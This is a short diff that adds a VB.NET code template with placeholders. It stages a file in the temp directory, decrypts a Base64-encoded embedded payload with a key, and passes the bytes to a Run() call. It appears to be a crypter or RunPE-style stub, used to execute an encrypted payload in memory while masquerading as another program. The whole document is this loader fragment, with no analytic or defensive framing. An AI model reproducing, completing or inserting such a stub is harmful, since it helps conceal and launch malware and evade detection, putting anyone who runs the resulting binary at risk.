@@ -1,0 +1,5 @@
+IO.File.Delete(IO.Path.GetTempPath & "%1%")
+IO.File.Copy("%2%", IO.Path.GetTempPath & "%1%")
+Dim %3% As String = %4%
+Dim %5% as Byte() = decrypt(Convert.FromBase64String(%3%),"%6%")
+Run(IO.Path.GetTempPath & "%1%", "", %5%, False)
